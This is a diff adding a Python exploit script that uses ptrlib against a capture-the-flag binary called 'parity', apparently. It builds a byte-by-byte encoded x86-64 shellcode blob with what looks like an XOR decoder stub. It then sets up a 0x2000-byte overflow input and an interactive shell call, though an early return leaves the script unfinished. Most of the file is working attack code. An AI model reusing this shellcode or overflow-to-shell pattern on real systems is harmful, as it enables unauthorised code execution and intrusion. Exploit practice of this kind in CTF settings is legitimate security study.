@@ -1,0 +1,83 @@
+#!/usr/bin/env python
+import ptrlib as ptr
+import sys
+
+elf = ptr.ELF("./parity")
+# libc = ptr.ELF("")
+# ld = ptr.ELF("")
+
+
+def connect():
+    if len(sys.argv) > 1 and sys.argv[1] == "remote":
+        return ptr.Socket("localhost", 5000)
+    else:
+        return ptr.Process(elf.filepath)
+
+
+def unwrap(x):
+    if x is None:
+        ptr.logger.error("unwrap failed")
+        exit(1)
+    else:
+        return x
+
+
+def main():
+    io = connect()
+
+    sc = b""
+    sc += b"\x48\x31"
+    sc += b"\xc9\x48"
+    sc += b"\x81\xe9"
+    sc += b"\xfa\xff"
+    sc += b"\xff\xff"
+    sc += b"\x48\x8d"
+    sc += b"\x05\xef"
+    sc += b"\xff\xff"
+    sc += b"\xff\x48"
+    sc += b"\xbb\xe8"
+    sc += b"\x84\xaf"
+    sc += b"\xcf\x93"
+    sc += b"\x01\x96"
+    sc += b"\x1b\x48"
+    sc += b"\x31\x58"
+    sc += b"\x27\x48"
+    sc += b"\x2d\xf8"
+    sc += b"\xff\xff"
+    sc += b"\xff\xe2"
+    sc += b"\xf4\xa0"
+    sc += b"\x3c\x80"
+    sc += b"\xad\xfa"
+    sc += b"\x6f\xb9"
+    sc += b"\x68\x80"
+    sc += b"\x84\x36"
+    sc += b"\x9f\xc7"
+    sc += b"\x5e\xc4"
+    sc += b"\x7d\x80"
+    sc += b"\xa9\xcc"
+    sc += b"\x9b\xcd"
+    sc += b"\x53\x7e"
+    sc += b"\x13\xe8"
+    sc += b"\x84\xaf"
+    sc += b"\xe0\xf1"
+    sc += b"\x68\xf8"
+    sc += b"\x34\x9b"
+    sc += b"\xec\xaf"
+    sc += b"\x99\xc4"
+    sc += b"\x55\xc8"
+    sc += b"\x71\xd3"
+    sc += b"\xdc\xa0"
+    sc += b"\xca\x93"
+    sc += b"\x01\x96"
+    sc += b"\x1b"
+
+    return
+    input(">>")
+    io.sendline("A" * 0x2000)
+    input(">>")
+
+    io.sh()
+
+
+if __name__ == "__main__":
+    main()
